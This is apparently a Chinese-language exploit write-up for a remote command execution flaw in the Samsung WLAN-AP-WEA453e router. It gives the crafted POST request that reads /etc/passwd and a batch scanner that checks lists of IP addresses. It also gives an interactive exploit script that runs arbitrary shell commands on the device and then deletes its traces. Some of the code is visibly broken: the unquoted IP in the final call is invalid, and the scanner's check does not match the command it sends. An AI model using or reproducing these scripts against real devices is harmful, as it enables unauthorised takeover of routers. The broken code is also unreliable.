### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|WLAN-AP-WEA453e RCE三星路由器远程命令执行漏洞|2020-8|未知|https://www.Samsung.com| |三星WLAN-AP-WEA453e路由器|

路由器首页
![image](https://user-images.githubusercontent.com/86941613/185778437-2e5218e7-68a0-4d60-8f53-2e91c0d576f4.png)

### 漏洞原理

利用burp构造特殊的请求

```shell
    POST /(download)/tmp/a.txt HTTP/1.1
    Host: xxx.xxx.xxx.xxx
    command1=shell:cat /etc/passwd| dd of=/tmp/a.txt
```
![image](https://user-images.githubusercontent.com/86941613/185778450-ef88e085-aa79-407d-a0ae-bedb50fb53dd.png)

### POC批量检测代码如下
```python
#filename: Check.py
#Usage: python3 Check.py ip.txt
import requests
import sys
import datetime

def CheckVuln(host):
    vurl = host+'/(download)/tmp/a.txt'
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36','Connection': 'close'}
    data = {'command1':'shell:ls|dd of=/tmp/a.txt'}
    try:
        req = requests.post(url=vurl,data=data,verify=False,headers=headers,timeout=1)
        
        if req.status_code ==200 and 'root' in req.text:
            T = ('[*]-'+host+'-----Vulnerable!')
            print(T)
            OutPut(T)
        else:
            T = ('[-]-'+host+'-----Not Vulnnerable')
            print(T)
            OutPut(T)

    except:
        T = host+'[-]-----Network Error'
        print(T)
        OutPut(T)

def OutPut(F):
    time =  datetime.datetime.now().strftime('%Y-%m-%d')
    #print(time)
    f = open(time+'.txt','a')
    f.write(F + '\n') 
    f.close()
            
def GetUrl(path):
    with open(path,'r',encoding='utf-8') as f:
        for i in f:
            if i.strip() != '':
                oldh = i.strip() 
                #print(oldh)
                host = 'http://'+oldh
                CheckVuln(host)
               
            else:
                print(path+'Empty File')

if len(sys.argv) != 2:
    print('-------------Usage:python3 Check.py ip.txt----------------- ')
    sys.exit()

path = sys.argv[1]

GetUrl(path)

```
### EXP
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import sys
import os
from urllib3.exceptions import InsecureRequestWarning

class exp:
    def Checking(self):
        try:
            Url = self.target + "(download)/tmp/hello.txt"
            CkData = "command1=shell:cat /etc/passwd| dd of=/tmp/hello.txt"
            response = requests.post(url = Url,data = CkData,verify = False,timeout = 20)
            if(response.status_code == 200 and 'root:' in response.text):
                return True
            else:
                return False
        except Exception as e:
            #print("checking")
            print("[-] Server Error!")

    def Exploit(self):
        Url = self.target + "(download)/tmp/hello.txt"
        while True:
            try:
                command = input("# ")
                if(command == 'exit'):
                    self.Clean()
                    sys.exit()
                if(command == 'cls'):
                    os.system("cls")
                    continue
                data = "command1=shell:" + command + "| dd of=/tmp/hello.txt"
                response = requests.post(url = Url,data = data,verify = False,timeout = 20)
                if(response.text == None):
                    print("[!] Server reply nothing")
                else:
                    print(response.text)
            except KeyboardInterrupt:
                self.Clean()
                exit()
            except Exception as e:
                print("[-] Server not suport this command")

    def Clean(self):
        Url = self.target + "(download)/tmp/hello.txt"
        try:
            CleanData = "command1=shell:busybox rm -f /tmp/hello.txt"
            response = requests.post(url = Url,data = CleanData,verify = False,timeout = 10)

            if(response.status_code == 200):
                print("[+] Clean target successfully!")
                sys.exit()
            else:
                print("[-] Clean Failed!")
        except Exception as e:
            print("[-] Server error!")

    def __init__(self,target,port):
        self.target=target
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

        if(len(sys.argv) == 3):
            module = sys.argv[2]
            if(module == 'clean'):
                self.Clean()
            else:
                print("[-] module error!")

        while self.Checking() is True:
            self.Exploit()
            
exp(192.168.10.1,80)
```
